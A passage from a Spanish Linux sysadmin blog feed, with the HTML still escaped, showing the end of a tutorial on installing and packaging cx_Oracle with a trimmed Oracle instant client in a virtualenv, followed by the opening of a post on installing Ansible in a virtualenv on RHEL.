root@oracle:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se activa el entorno virtual y se instala la librería mediante &lt;strong&gt;pip&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@oracle:~# . env/bin/activate
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle:~# pip install cx_Oracle
Collecting cx-Oracle
  Using cached cx_Oracle-5.2.1.tar.gz
Building wheels &lt;span class="k"&gt;for&lt;/span&gt; collected packages: cx-Oracle
  Running setup.py bdist_wheel &lt;span class="k"&gt;for&lt;/span&gt; cx-Oracle ... &lt;span class="k"&gt;done&lt;/span&gt;
  Stored in directory: /root/.cache/pip/wheels/1f/38/66/b37c50906777b231a241ee02134f0ae018615519af43566269
Successfully built cx-Oracle
Installing collected packages: cx-Oracle
Successfully installed cx-Oracle-5.2.1
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos verificar si funciona cargando el módulo, y por ejemplo, preguntando la versión del mismo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle:~# python -c &lt;span class="s2"&gt;&amp;quot;import cx_Oracle; print cx_Oracle.version&amp;quot;&lt;/span&gt;
Traceback &lt;span class="o"&gt;(&lt;/span&gt;most recent call last&lt;span class="o"&gt;)&lt;/span&gt;:
  File &lt;span class="s2"&gt;&amp;quot;&amp;lt;string&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;1&lt;/span&gt;, in &amp;lt;module&amp;gt;
ImportError: libclntsh.so.12.1: cannot open shared object file: No such file or directory
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Este es un mal resultado; nos indica que no se encuentra un fichero &lt;em&gt;.so&lt;/em&gt;. Este fichero está en &lt;strong&gt;ORACLE_HOME&lt;/strong&gt;, pero el sistema intenta buscar en &lt;strong&gt;LD_LIBRARY_PATH&lt;/strong&gt;. Con modificar esta variable de entorno funciona.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle:~# &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;LD_LIBRARY_PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$ORACLE_HOME&lt;/span&gt;:&lt;span class="nv"&gt;$LD_LIBRARY_PATH&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Otro error es que se queje de que no encuentra &lt;em&gt;libaio.so&lt;/em&gt;. Esto indica que os habéis saltado los requisitos y necesitáis instalarlos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle:~# python -c &lt;span class="s2"&gt;&amp;quot;import cx_Oracle; print cx_Oracle.version&amp;quot;&lt;/span&gt;
Traceback &lt;span class="o"&gt;(&lt;/span&gt;most recent call last&lt;span class="o"&gt;)&lt;/span&gt;:
  File &lt;span class="s2"&gt;&amp;quot;&amp;lt;string&amp;gt;&amp;quot;&lt;/span&gt;, line &lt;span class="m"&gt;1&lt;/span&gt;, in &amp;lt;module&amp;gt;
ImportError: libaio.so.1: cannot open shared object file: No such file or directory
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle:~# apt-get install libaio1
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
Se instalarán los siguientes paquetes NUEVOS:
  libaio1
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;1&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;9&lt;/span&gt;.634 B de archivos.
Se utilizarán &lt;span class="m"&gt;13&lt;/span&gt;,3 kB de espacio de disco adicional después de esta operación.
...
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente obtenemos un resultado correcto, que nos indica que tenemos instalada la librería en nuestro entorno virtual.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle:~# python -c &lt;span class="s2"&gt;&amp;quot;import cx_Oracle; print cx_Oracle.version&amp;quot;&lt;/span&gt;
&lt;span class="m"&gt;5&lt;/span&gt;.2.1
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos aprovechar esta compilación para máquinas con el mismo tipo de procesador y con la misma versión de &lt;strong&gt;python&lt;/strong&gt;, creando un fichero &lt;em&gt;wheel&lt;/em&gt; con la librería ya compilada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle:~# pip wheel cx_Oracle
Collecting cx-Oracle
  Saved ./cx_Oracle-5.2.1-cp27-cp27mu-linux_i686.whl
Skipping cx-Oracle, due to already being wheel.
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ese es el fichero que vamos a distribuir a los entornos de producción donde necesitemos crear &lt;em&gt;scripts&lt;/em&gt; en &lt;strong&gt;python&lt;/strong&gt; que se conecten a Oracle.&lt;/p&gt;
&lt;h2&gt;Instalando en otras máquinas&lt;/h2&gt;
&lt;p&gt;Vamos a suponer que nos interesa poner el &lt;em&gt;runtime&lt;/em&gt; de Oracle y la carpeta con nuestros &lt;em&gt;scripts&lt;/em&gt; en &lt;em&gt;/opt/&lt;/em&gt;. De hecho, nada impide que se haga en una carpeta personal, en la que tengamos privilegios completos.&lt;/p&gt;
&lt;p&gt;También vamos a necesitar un &lt;em&gt;instant client&lt;/em&gt; para poder funcionar, aunque esta vez no se necesitan enlaces simbólicos ni declarar la variable de entorno &lt;strong&gt;ORACLE_HOME&lt;/strong&gt;. Lo descargamos en su localización deseada.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@oracle2:/opt# unzip /root/instantclient-basic-linux-12.1.0.2.0.zip
Archive:  /root/instantclient-basic-linux-12.1.0.2.0.zip
  inflating: instantclient_12_1/adrci
  inflating: instantclient_12_1/BASIC_README
  inflating: instantclient_12_1/genezi
  inflating: instantclient_12_1/libclntshcore.so.12.1
  inflating: instantclient_12_1/libclntsh.so.12.1
  inflating: instantclient_12_1/libnnz12.so
  inflating: instantclient_12_1/libocci.so.12.1
  inflating: instantclient_12_1/libociei.so
  inflating: instantclient_12_1/libocijdbc12.so
  inflating: instantclient_12_1/libons.so
  inflating: instantclient_12_1/liboramysql12.so
  inflating: instantclient_12_1/ojdbc6.jar
  inflating: instantclient_12_1/ojdbc7.jar
  inflating: instantclient_12_1/uidrvci
  inflating: instantclient_12_1/xstreams.jar
root@oracle2:/opt#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Las dependencias deberían estar ya instaladas, pero en mi caso no lo estaban. Las instalamos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@oracle2:/opt# apt-get install python libaio1
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
Se instalarán los siguientes paquetes extras:
  file libexpat1 libffi6 libmagic1 libpython-stdlib libpython2.7-minimal libpython2.7-stdlib libsqlite3-0 mime-support
  python-minimal python2.7 python2.7-minimal
Paquetes sugeridos:
  python-doc python-tk python2.7-doc binutils binfmt-support
Se instalarán los siguientes paquetes NUEVOS:
  file libaio1 libexpat1 libffi6 libmagic1 libpython-stdlib libpython2.7-minimal libpython2.7-stdlib libsqlite3-0 mime-support
  python python-minimal python2.7 python2.7-minimal
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;14&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;5&lt;/span&gt;.020 kB de archivos.
Se utilizarán &lt;span class="m"&gt;21&lt;/span&gt;,3 MB de espacio de disco adicional después de esta operación.
¿Desea continuar? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...  
root@oracle2:/opt#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Creamos la carpeta que va a contener el entorno virtual y los &lt;em&gt;scripts&lt;/em&gt;, y creamos en ella el entorno virtual.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@oracle2:/opt# mkdir scripts
root@oracle2:/opt# &lt;span class="nb"&gt;cd&lt;/span&gt; scripts/
root@oracle2:/opt/scripts# virtualenv env
New python executable in /opt/scripts/env/bin/python
Installing setuptools, pip, wheel...done.
root@oracle2:/opt/scripts#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Activamos el entorno virtual y le instalamos el fichero &lt;em&gt;wheel&lt;/em&gt;, que habremos copiado en algún sitio. Este fichero es local a la máquina, y no se consulta el repositorio de &lt;strong&gt;python&lt;/strong&gt; remoto para nada. De hecho, un &lt;em&gt;wheel&lt;/em&gt; es un fichero &lt;em&gt;.zip&lt;/em&gt; normal, que se descomprime en la carpeta adecuada del &lt;strong&gt;virtualenv&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@oracle2:/opt/scripts# . env/bin/activate
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle2:/opt/scripts# pip install /root/cx_Oracle-5.2.1-cp27-cp27mu-linux_i686.whl
Processing /root/cx_Oracle-5.2.1-cp27-cp27mu-linux_i686.whl
Installing collected packages: cx-Oracle
Successfully installed cx-Oracle-5.2.1
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle2:/opt/scripts#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Probamos que funcione; es importante definir la variable de entorno &lt;strong&gt;LD_LIBRARY_PATH&lt;/strong&gt; para que encuentre el &lt;em&gt;runtime&lt;/em&gt; de Oracle. Es muy útil ponerlo en el fichero &lt;em&gt;~/.bashrc&lt;/em&gt; para que se cargue solo al abrir el &lt;em&gt;shell&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle2:/opt/scripts# &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;LD_LIBRARY_PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/opt/instantclient_12_1/
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle2:/opt/scripts# python -c &lt;span class="s2"&gt;&amp;quot;import cx_Oracle; print cx_Oracle.version&amp;quot;&lt;/span&gt;
&lt;span class="m"&gt;5&lt;/span&gt;.2.1
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle2:/opt/scripts#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Opcionalmente, podemos reducir la cantidad de librerías que conforman el &lt;em&gt;instant client&lt;/em&gt;, ya que solo se necesitan 4, y reduce su tamaño de forma dramática.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle2:/opt/scripts# du -sh /opt/instantclient_12_1/
169M    /opt/instantclient_12_1/
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle2:/opt/scripts#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que el &lt;em&gt;package&lt;/em&gt; &lt;strong&gt;cx_Oracle&lt;/strong&gt; es un fichero &lt;em&gt;.so&lt;/em&gt; y que este requiere de los otros 4 en el &lt;em&gt;runtime&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(env) root@oracle2:/opt/scripts# find env/ -name &amp;quot;*.so&amp;quot;
env/lib/python2.7/site-packages/cx_Oracle.so
(env) root@oracle2:/opt/scripts# ldd env/lib/python2.7/site-packages/cx_Oracle.so | grep instant
        libclntsh.so.12.1 =&amp;gt; /opt/instantclient_12_1/libclntsh.so.12.1 (0xb5387000)
        libnnz12.so =&amp;gt; /opt/instantclient_12_1/libnnz12.so (0xb4d9d000)
        libons.so =&amp;gt; /opt/instantclient_12_1/libons.so (0xb4d69000)
        libclntshcore.so.12.1 =&amp;gt; /opt/instantclient_12_1/libclntshcore.so.12.1 (0xb4a90000)
(env) root@oracle2:/opt/scripts# ldd /opt/instantclient_12_1/lib{clntsh,nnz,ons}* | grep instant
/opt/instantclient_12_1/libclntshcore.so.12.1:
/opt/instantclient_12_1/libclntsh.so.12.1:
        libnnz12.so =&amp;gt; /opt/instantclient_12_1/libnnz12.so (0xb4f8c000)
        libons.so =&amp;gt; /opt/instantclient_12_1/libons.so (0xb4f58000)
        libclntshcore.so.12.1 =&amp;gt; /opt/instantclient_12_1/libclntshcore.so.12.1 (0xb4aec000)
/opt/instantclient_12_1/libnnz12.so:
        libclntshcore.so.12.1 =&amp;gt; /opt/instantclient_12_1/libclntshcore.so.12.1 (0xb7115000)
/opt/instantclient_12_1/libons.so:
(env) root@oracle2:/opt/scripts#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lo que significa que debería ser seguro eliminar el resto. Así que lo hacemos. Guardad una copia de seguridad antes de eliminar nada.&lt;/p&gt;
&lt;p&gt;Tras eliminar lo que no nos sirve, la carpeta queda así:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle2:/opt/scripts# tree /opt/instantclient_12_1/
/opt/instantclient_12_1/
├── libclntshcore.so.12.1
├── libclntsh.so.12.1
├── libnnz12.so
└── libons.so

&lt;span class="m"&gt;0&lt;/span&gt; directories, &lt;span class="m"&gt;4&lt;/span&gt; files
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle2:/opt/scripts# du -sh /opt/instantclient_12_1/
55M     /opt/instantclient_12_1/
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle2:/opt/scripts#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No está nada mal; hemos pasado de 169mb a 55mb. Comprobamos que sigue funcionando:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle2:/opt/scripts# python -c &lt;span class="s2"&gt;&amp;quot;import cx_Oracle; print cx_Oracle.version&amp;quot;&lt;/span&gt;
&lt;span class="m"&gt;5&lt;/span&gt;.2.1
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle2:/opt/scripts#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y parece correcto.&lt;/p&gt;
&lt;h2&gt;Uso del package cx_Oracle&lt;/h2&gt;
&lt;p&gt;En este punto hay que seguir la documentación del módulo, que no es muy diferente de otras bases de datos; &lt;strong&gt;cx_Oracle&lt;/strong&gt; sigue la misma especificación para todos los módulos de bases de datos.&lt;/p&gt;
&lt;p&gt;La idea es que se crea un objeto &lt;strong&gt;conexión&lt;/strong&gt;, del que se saca un &lt;strong&gt;cursor&lt;/strong&gt; para cada consulta que queramos ejecutar, y que se itera para obtener las &lt;strong&gt;filas&lt;/strong&gt;. Pongamos un ejemplo simple:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle2:/opt/scripts# cat list_fruits.py
&lt;span class="c1"&gt;#!/usr/bin/env python&lt;/span&gt;

import cx_Oracle

&lt;span class="nv"&gt;HOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;my_host&amp;#39;&lt;/span&gt;
&lt;span class="nv"&gt;PORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;my_port&amp;#39;&lt;/span&gt;
&lt;span class="nv"&gt;SID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;my_sid&amp;#39;&lt;/span&gt;
&lt;span class="nv"&gt;SERVICE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;my_service_name&amp;#39;&lt;/span&gt;
&lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;nobody&amp;#39;&lt;/span&gt;
&lt;span class="nv"&gt;PASSWORD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;secret&amp;#39;&lt;/span&gt;

&lt;span class="nv"&gt;dsn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; cx_Oracle.makedsn&lt;span class="o"&gt;(&lt;/span&gt;HOST, PORT, SID, SERVICE&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="nv"&gt;connection&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; cx_Oracle.connect&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;USER, &lt;span class="nv"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;PASSWORD, &lt;span class="nv"&gt;dsn&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;dsn&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="nv"&gt;query&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;select name, price from fruits&amp;quot;&lt;/span&gt;
&lt;span class="nv"&gt;cursor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; connection.cursor&lt;span class="o"&gt;()&lt;/span&gt;
cursor.execute&lt;span class="o"&gt;(&lt;/span&gt;query&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; row in cursor:
    print &lt;span class="s1"&gt;&amp;#39;;&amp;#39;&lt;/span&gt;.join&lt;span class="o"&gt;(&lt;/span&gt;row&lt;span class="o"&gt;)&lt;/span&gt;
cursor.close&lt;span class="o"&gt;()&lt;/span&gt;

connection.close&lt;span class="o"&gt;()&lt;/span&gt;
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle2:/opt/scripts#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ejecutamos como cualquier otro &lt;em&gt;script&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle2:/opt/scripts# ./list_fruits.py
Apple&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.99
Orange&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.89
Pear&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.19
&lt;span class="o"&gt;(&lt;/span&gt;env&lt;span class="o"&gt;)&lt;/span&gt; root@oracle2:/opt/scripts#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y obtenemos los datos deseados, con la facilidad que nos aporta &lt;strong&gt;python&lt;/strong&gt; para dar formato fácil a la salida de nuestros &lt;em&gt;scripts&lt;/em&gt;.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="python"></category><category term="oracle"></category><category term="script"></category><category term="virtualenv"></category><category term="wheel"></category></entry><entry><title>Instalando ansible para gestionar servidores</title><link href="http://www.linuxsysadmin.ml/2016/04/instalando-ansible-para-gestionar-servidores.html" rel="alternate"></link><published>2016-04-11T08:00:00+02:00</published><updated>2016-04-11T08:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-04-11:/2016/04/instalando-ansible-para-gestionar-servidores.html</id><summary type="html">&lt;p&gt;Cuando nos encontramos delante de servidores únicos, es bastante fácil su gestión. Sin embargo, cuando tenemos 8 instancias de cada tipo de servidor, las tareas se vuelven lentas y repetitivas. Podemos incluso automatizar la gestión de una sola máquina para hacer su entorno fácilmente reproducible, en vistas a su reconstrucción …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando nos encontramos delante de servidores únicos, es bastante fácil su gestión. Sin embargo, cuando tenemos 8 instancias de cada tipo de servidor, las tareas se vuelven lentas y repetitivas. Podemos incluso automatizar la gestión de una sola máquina para hacer su entorno fácilmente reproducible, en vistas a su reconstrucción.&lt;/p&gt;
&lt;p&gt;Para ello existen algunas herramientas capaces de modificar los servidores, sea mediante un protocolo de &lt;strong&gt;pull&lt;/strong&gt; (&lt;strong&gt;puppet&lt;/strong&gt;, &lt;strong&gt;chef&lt;/strong&gt;) que tienen agentes capaces de pedir a un servidor central las reglas a aplicarse, o mediante un protocolo de &lt;strong&gt;push&lt;/strong&gt; (&lt;strong&gt;fabric&lt;/strong&gt;, &lt;strong&gt;ansible&lt;/strong&gt;) que simplemente son formas de enviar esas órdenes desde el servidor central.&lt;/p&gt;
&lt;p&gt;Hoy vamos a instalar &lt;strong&gt;ansible&lt;/strong&gt;, herramienta que considero muy interesante por su simplicidad; carece de agentes activos, funcionando como un conjunto de &lt;em&gt;scripts&lt;/em&gt; en una máquina cualquiera que actúa de servidor y utilizando el protocolo &lt;strong&gt;SSH&lt;/strong&gt; para empujar los &lt;em&gt;scripts&lt;/em&gt;, que se ejecutan con un &lt;strong&gt;python&lt;/strong&gt; en el servidor destino.&lt;/p&gt;
&lt;p&gt;Si estuviéramos en una máquina tipo &lt;strong&gt;Debian&lt;/strong&gt;/&lt;strong&gt;Ubuntu&lt;/strong&gt;, la instalación es tan fácil como lanzar &lt;strong&gt;apt-get&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~$ apt-get install ansible
...  
root@server:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sin embargo, instalarlo a nivel de sistema es un problema en algunos entornos, así que podemos instalarlo en una carpeta local, concretamente en un &lt;strong&gt;virtualenv&lt;/strong&gt; dedicado en nuestra carpeta personal. Esta es la forma que se explica en este tutorial.&lt;/p&gt;
&lt;p&gt;Empezaremos con un servidor cualquiera; al no tener agentes activos y ser &lt;em&gt;scripts&lt;/em&gt;, nos vale cualquiera. En este caso se ha usado una máquina tipo &lt;strong&gt;RedHat&lt;/strong&gt;. Realmente no nos importa demasiado la versión de &lt;strong&gt;python&lt;/strong&gt; que utilice.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ cat /etc/redhat-release
Red Hat Enterprise Linux Server release &lt;span class="m"&gt;6&lt;/span&gt;.7 &lt;span class="o"&gt;(&lt;/span&gt;Santiago&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ python -V
Python &lt;span class="m"&gt;2&lt;/span&gt;.6.6
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Creación del virtualenv con ansible&lt;/h2&gt;
&lt;p&gt;Vamos a construir el &lt;strong&gt;virtualenv&lt;/strong&gt; desde cero. Si nos interesara hacerlo en otra máquina en la que tengamos permisos para instalar paquetes, bastaría con copiar la carpeta del &lt;strong&gt;virtualenv&lt;/strong&gt; en el mismo sitio, y sin instalar nada mas.&lt;/p&gt;
&lt;p&gt;Las únicas dependencias que se necesitan para construir el &lt;strong&gt;virtualenv&lt;/strong&gt; es &lt;strong&gt;python&lt;/strong&gt;, &lt;strong&gt;gcc&lt;/strong&gt; y &lt;strong&gt;python-devel&lt;/strong&gt; (o &lt;strong&gt;python-dev&lt;/strong&gt; si se tratara de una máquina tipo &lt;strong&gt;Debian&lt;/strong&gt;/&lt;strong&gt;Ubuntu&lt;/strong&gt;). Como ya tenemos &lt;strong&gt;gcc&lt;/strong&gt; y &lt;strong&gt;python&lt;/strong&gt;, instalamos solamente &lt;strong&gt;python-devel&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@toolbox:~$ sudo yum install python-devel
Loaded plugins: product-id, subscription-manager
This system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.
Setting up Install Process
...
Installed:
  python-devel.x86_64 &lt;span class="m"&gt;0&lt;/span&gt;:2.6.6-64.el6

Complete!
gerard@toolbox:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para no instalar nada innecesario en la máquina, vamos a descargar el comando &lt;em&gt;virtualenv&lt;/em&gt;, que va a cumplir su función y va a ser eliminado. Lo descargamos y lo descomprimimos, en cualquier carpeta.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ wget https://pypi.python.org/packages/source/v/virtualenv/virtualenv-15.0.1.tar.gz
--2016-04-05 &lt;span class="m"&gt;11&lt;/span&gt;:54:27--  https://pypi.python.org/packages/source/v/virtualenv/virtualenv-15.0.1.tar.gz
Resolving pypi.python.org... &lt;span class="m"&gt;23&lt;/span&gt;.235.43.223
Connecting to pypi.python.org&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="m"&gt;23&lt;/span&gt;.235.43.223&lt;span class="p"&gt;|&lt;/span&gt;:443... connected.
HTTP request sent, awaiting response... &lt;span class="m"&gt;200&lt;/span&gt; OK
Length: &lt;span class="m"&gt;1842776&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.8M&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;application/octet-stream&lt;span class="o"&gt;]&lt;/span&gt;
Saving to: “virtualenv-15.0.1.tar.gz”

&lt;span class="m"&gt;100&lt;/span&gt;%&lt;span class="o"&gt;[========================================================================================&lt;/span&gt;&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;,842,776   &lt;span class="m"&gt;2&lt;/span&gt;.90M/s   in &lt;span class="m"&gt;0&lt;/span&gt;.6s

&lt;span class="m"&gt;2016&lt;/span&gt;-04-05 &lt;span class="m"&gt;11&lt;/span&gt;:54:28 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;.90 MB/s&lt;span class="o"&gt;)&lt;/span&gt; - “virtualenv-15.0.1.tar.gz” saved &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;1842776&lt;/span&gt;/1842776&lt;span class="o"&gt;]&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$ tar xzf virtualenv-15.0.1.tar.gz
&lt;span class="o"&gt;[&lt;/span&gt;gerard@toolbox ~&lt;span class="o"&gt;]&lt;/span&gt;$
&lt;/pre&gt;&lt;/div&gt;


